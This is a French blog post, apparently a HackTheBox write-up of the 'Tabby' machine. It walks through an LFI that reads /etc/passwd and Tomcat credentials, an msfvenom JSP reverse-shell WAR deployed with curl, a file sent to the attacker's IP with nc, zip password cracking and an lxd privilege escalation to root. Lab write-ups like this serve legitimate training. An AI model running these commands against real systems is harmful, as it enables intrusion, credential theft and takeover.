@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    
+      <title>Tabby :: AlrikRr - BlogPost — Bienvenue sur mon BlogPost</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Hello, bienvenue sur mon write-up de la machine Tabby sur HackTheBox !
+ Tools  Kali-Linux &#43; Outils 2020 shell : zsh Vitualbox pour la machine kali-linux   NMAP Comme d&amp;rsquo;habitude, un petit nmap pour voir les ports ouverts avec les numéros de version sur possible.
+~ ヤマト» sudo nmap -A -sU -F -T 5 10.10.10.194
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2."/>
+<meta name="keywords" content="linux, tuto, programmation, python"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/writeup/tabby/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Tabby"/>
+<meta name="twitter:description" content="HackTheBox : Tabby"/>
+
+
+
+<meta property="og:title" content="Tabby" />
+<meta property="og:description" content="HackTheBox : Tabby" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeup/tabby/" />
+<meta property="article:published_time" content="2020-08-02T11:28:46+02:00" />
+<meta property="article:modified_time" content="2020-08-02T11:28:46+02:00" /><meta property="og:site_name" content="AlrikRr - BlogPost" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">AlrikRr - BlogPost</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+
+
+    <span class="header__right">
+      
+        <nav class="menu">
+	<ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+	<li><a href="/tuto">Les Tutos</a></li>
+        
+      
+        
+	<li><a href="/secu">Sécurité</a></li>
+        
+      
+        
+	<li><a href="/writeup">Write-Up</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Autres catégories
+            <span class="menu__sub-inner-more-trigger-icon"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+          </li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+	      <li><a href="/binary">Exploit-Binaire</a></li>
+              
+            
+              
+	      <li><a href="/iot">IOT</a></li>
+              
+            
+              
+	      <li><a href="/nixos">NIXOS</a></li>
+              
+            
+              
+	      <li><a href="/arch">Archlinux</a></li>
+              
+            
+              
+	      <li><a href="/ml">MachineLearning</a></li>
+              
+            
+              
+	      <li><a href="/about">A propos !</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/tuto">Les Tutos</a></li>
+      
+    
+      
+        <li><a href="/secu">Sécurité</a></li>
+      
+    
+      
+        <li><a href="/writeup">Write-Up</a></li>
+      
+    
+      
+        <li><a href="/binary">Exploit-Binaire</a></li>
+      
+    
+      
+        <li><a href="/iot">IOT</a></li>
+      
+    
+      
+        <li><a href="/nixos">NIXOS</a></li>
+      
+    
+      
+        <li><a href="/arch">Archlinux</a></li>
+      
+    
+      
+        <li><a href="/ml">MachineLearning</a></li>
+      
+    
+      
+        <li><a href="/about">A propos !</a></li>
+      
+    
+  </ul>
+</nav>
+
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/writeup/tabby/">Tabby</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          02-08-2020
+        </span>
+
+        
+      
+
+      <span class="post-author">— Ecrit par AlrikRr</span>
+      
+        <span class="post-read-time">— 5 Minutes</span>
+      
+    </div>
+
+    
+
+    
+      
+        <img src="/img/fr/writeup/tabby/htb-tabby.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      
+      <p><img src="/img/fr/writeup/tabby/tabby.png" alt="tabby"></p>
+<p>Hello, bienvenue sur mon write-up de la machine Tabby sur HackTheBox !</p>
+<hr>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>Kali-Linux + Outils 2020</li>
+<li>shell : zsh</li>
+<li>Vitualbox pour la machine kali-linux</li>
+</ul>
+<hr>
+<h2 id="nmap">NMAP</h2>
+<p>Comme d&rsquo;habitude, un petit <code>nmap</code> pour voir les ports ouverts avec les numéros de version sur possible.</p>
+<p><code>~ ヤマト» sudo nmap -A -sU -F -T 5 10.10.10.194</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+
+Not shown: 81 open|filtered ports
+PORT      STATE  SERVICE       VERSION
+49/udp    closed tacacs
+88/udp    closed kerberos-sec
+518/udp   closed ntalk
+631/udp   closed ipp
+999/udp   closed applix
+1025/udp  closed blackjack
+2000/udp  closed cisco-sccp
+2049/udp  closed nfs
+2223/udp  closed rockwell-csp2
+4444/udp  closed krb524
+10000/udp closed ndmp
+17185/udp closed wdbrpc
+31337/udp closed BackOrifice
+32769/udp closed filenet-rpc
+49152/udp closed unknown
+49153/udp closed unknown
+49156/udp closed unknown
+49181/udp closed unknown
+49200/udp closed unknown
+</code></pre><p>Je regarde vite fait les ports ouvert, rien de très interessant pendant mes recherches.</p>
+<p>Peut-être un exploit pour <strong>filenet-rpc</strong> ? <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/msf_rpc_console">msf_rpc_console</a> Mais il me faut un login/passwd pour réaliser cet exploit.</p>
+<h2 id="dirb">DIRB</h2>
+<p>EN même temps je lance un <code>dirb</code> sur le site web.</p>
+<p><code>~ ヤマト» dirb http://10.10.10.194 /usr/share/dirb/wordlists/big.txt</code></p>
+<p>Il y a quelques pages qui ont l&rsquo;air intéressantes :</p>
+<ul>
+<li><code>http://10.10.10.194/files/archive/ </code></li>
+<li><code>http://10.10.10.194/files/statement</code></li>
+</ul>
+<p>A voir si on peut exploiter quelques chose avec.</p>
+<h2 id="tomcat">TOMCAT</h2>
+<p>Sur l&rsquo;adresse : <code>http://10.10.10.194:8080</code> on tombe sur la page pas défaut de <strong>tomcat</strong>.</p>
+<p><img src="/img/fr/writeup/tabby/tomcat.png" alt="tomcat"></p>
+<p>Dans le home du site web, si on clique sur <strong>NEWS</strong> On est redirigé vers : <code>http://megahosting.htb/news.php?file=statement</code></p>
+<p>J&rsquo;ai essayé de voir si le site est vulnérable a une attaque <strong>LFI</strong>.</p>
+<p>Le site <code>megahosting.htb</code> est inaccessible mais si l&rsquo;on produit une <strong>LFI</strong> sur l&rsquo;adresse IP comme ceci :</p>
+<ul>
+<li><code>http://10.10.10.194/news.php?file=../../../../../../../../etc/passwd</code></li>
+</ul>
+<p>Ca fonctionne !</p>
+<p><img src="/img/fr/writeup/tabby/lfi.png" alt="LFI"></p>
+<p>On avance un peu !</p>
+<p>En faisant des recherche sur <strong>tomcat</strong> j&rsquo;ai vu qu&rsquo;il existait un fichier qui pourrais ocntenir des creds utilisateurs.</p>
+<p><a href="https://www.ibm.com/support/knowledgecenter/SS6RHZ_6.0.6/com.ibm.rational.pe.install.doc/topics/t_rpeng_users_tomcat.html">t_rpeng_users_tomcat</a></p>
+<p>fichier : <code>tomcat-users.xml</code></p>
+<p>Qui se trouve donc ici :</p>
+<ul>
+<li><code>http://10.10.10.194/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml</code></li>
+</ul>
+<p><img src="/img/fr/writeup/tabby/tomcat-users.png" alt="tomcat-users"></p>
+<p>Ce fichier contient :</p>
+<ul>
+<li><code>username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;</code></li>
+</ul>
+<p>On peu trouver une page de connexion dans <code>/manager/html</code></p>
+<p><img src="/img/fr/writeup/tabby/tomcat-auth.png" alt="tomcat-auth"></p>
+<p>Mais ca ne fonctionne pas.<br>
+En fait ce n&rsquo;est pas la bonne page de connexion, la bonne se trouve ici :</p>
+<ul>
+<li><code>http://10.10.10.194:8080/host-manager/html</code></li>
+</ul>
+<p>Ce qui nous permet d&rsquo;accéder au Dashboard tomcat !</p>
+<p><img src="/img/fr/writeup/tabby/tomcat-manager.png" alt="tomcat-manager"></p>
+<h2 id="exploit">Exploit</h2>
+<p>Nous avons un login et un mot de passe, il ne nous reste plus qu&rsquo;a chercher une CVE ou un exploit pour tomcat.</p>
+<p><a href="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/">multiple-ways-to-exploit-tomcat-manager</a></p>
+<p><img src="/img/fr/writeup/tabby/tomcat-msf.png" alt="tomcat-msf"></p>
+<p>Bon cet exploit ne fonctionne pas.</p>
+<p>Je vais essayé celui avec le <strong>WAR</strong> file.</p>
+<p>J&rsquo;ai quelques souis avec cet exploit, je dois trouver comment upload un shell sur tomcat. Pour ca, il faut lire la doc !</p>
+<p><img src="/img/fr/writeup/tabby/tomcat-doc.png" alt="tomcat-doc"></p>
+<p>Il faut l&rsquo;upload dans <code>manager/text/deploy</code></p>
+<p>Premièrement il nous fait générer un shell :</p>
+<ul>
+<li><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f war &gt; shell.war</code></li>
+</ul>
+<p>Ensuite il faut l&rsquo;upload avec <code>curl</code> :</p>
+<ul>
+<li><code>curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war &quot;http://10.10.10.194:8080/manager/text/deploy?path=/yamato-shell&quot;</code></li>
+</ul>
+<p>Et pour finir, il faut accéder à notre shell :</p>
+<ul>
+<li><code>http://10.10.10.194:8080/yamato-shell/</code></li>
+</ul>
+<p>BINGO !</p>
+<p><img src="/img/fr/writeup/tabby/nc.png" alt="nc"></p>
+<p>Pour avoir un plus beau shell on va utiliser python:</p>
+<ul>
+<li><code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code></li>
+</ul>
+<h2 id="road-to-user">Road to USER</h2>
+<p>On n&rsquo;a pas encore accès au flag user.</p>
+<p>On va jeter un oeil dans <code>/var/www/html</code>.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">tomcat@tabby:/var/www/html/files$ ls
+ls
+16162020_backup.zip  archive  revoked_certs  statement
+</code></pre><p>L&rsquo;archive 16162020_backup.zip est intéressante, on va la télécharger en utilisant <strong>nc</strong>.</p>
+<p>yamato : <code>nc -lp 8888 &gt;16162020_backup.zip</code><br>
+tomcat : <code>nc -w 3 10.10.14.16 8888 &lt; 16162020_backup.zip</code></p>
+<p>Nous voila avec notre archive mais celle-ci est protégée par un mot de passe.</p>
+<p>Nous allons essayé de cracker le mot de passe : <a href="https://subscription.packtpub.com/book/networking_and_servers/9781784390303/6/06lvl1sec72/cracking-zip-file-passwords">cracking-zip-file-passwords</a></p>
+<p>On installe <strong>fcrackzip</strong> et on utilise <strong>rockyou.txt</strong> pour trouver le mot de passe :</p>
+<ul>
+<li><code>fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' 16162020_backup.zip </code></li>
+</ul>
+<p>C&rsquo;est très rapide :</p>
+<ul>
+<li><code>PASSWORD FOUND!!!!: pw == admin@it</code></li>
+</ul>
+<p><img src="/img/fr/writeup/tabby/zip.png" alt="zip"></p>
+<p>Rien d&rsquo;interessant dans l&rsquo;archive, mais le mot de passe par contre lui &hellip;</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">tomcat@tabby:/var/www/html/files$ su ash
+su ash
+Password: admin@it
+
+ash@tabby:/var/www/html/files$ 
+</code></pre><p>C&rsquo;est le mot de passe de ash !</p>
+<p>Nous avons accès au flag USER !</p>
+<p><code>6f7bcdc3172c7538a24dcd0bcea8c827</code></p>
+<h2 id="road-to-root">Road to ROOT</h2>
+<p>Bon, maintenant, il nous faut trouver un moyen d&rsquo;accéder au flag root !</p>
+<p>Rien dans <code>sudo -l</code>.</p>
+<p>Il y a un fichier dans <code>/home/ash</code> :</p>
+<ul>
+<li><code>.sudo_as_admin_successful</code></li>
+</ul>
+<p>Je ne sais pas a quoi il sert pour le moment, je mets de côté.</p>
+<p>On peut voir que le user <strong>ash</strong> a des droits sur <strong>lxd</strong> que j&rsquo;ai vu dans le dossier <strong>snap</strong> :</p>
+<ul>
+<li><code>uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) </code></li>
+</ul>
+<p>On peut se pencher sur ça pour continuer.</p>
+<p>J&rsquo;ai pu trouver un exploit pour une priv-esc en utilisant <strong>lxd</strong>.</p>
+<p><a href="https://www.exploit-db.com/exploits/46978">https://www.exploit-db.com/exploits/46978</a></p>
+<p>J&rsquo;ai eu quelques porblèmes pour build, je vais directement télécharger le binaire sur le github <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
+<p>On execute le binaire <strong>build-alpine</strong>.</p>
+<p>Et on utilise <strong>nc</strong> pour l&rsquo;envoyer sur la machine.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell"># ash HTB
+ash@tabby:~$ nc -lp 8888 &gt; alpine-v3.12-x86_64-20200731_1514.tar.gz 
+
+# yamaot Host
+ヤマト» nc -w 3 10.10.10.194 8888 &lt; alpine-v3.12-x86_64-20200731_1514.tar.gz
+</code></pre><p>Très bien, pas d&rsquo;erreurs, on va importer l&rsquo;image :</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">lxc image import alpine-v3.12-x86_64-20200731_1514.tar.gz --alias yamato-alpine
+</code></pre><p>PS : Petite erreur de ma part sur le nom de l&rsquo;image, rien de très grave.<br>
+<img src="/img/fr/writeup/tabby/lxc-list.png" alt="lxc"></p>
+<p>Ensuite, on init notre image avec l&rsquo;option <strong>security.privileged=true</strong></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">lxc init alpine-v3.3 yamato-alpine -c security.privileged=true 
+</code></pre><p>Un erreur ??</p>
+<p>J&rsquo;ai oublié d&rsquo;init l&rsquo;image avant : <code>lxd init --auto</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">lxc config device add yamato-alpine giveMeRoot disk source=/ path=/mnt/root recursive=true
+lxc start yamato-alpine
+lxc exec yamato-alpine /bin/sh
+</code></pre><p>Voila que j&rsquo;ai un shell pas très beau.
+Mais j&rsquo;ai accès au flag ROOT dans <code>/mnt/root/root</code>.</p>
+<p><img src="/img/fr/writeup/tabby/lxc-exec.png" alt="shell"></p>
+<p>Et voilà !</p>
+
+    </div>
+    
+
+
+    
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">@AlrikRr - 2020</div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
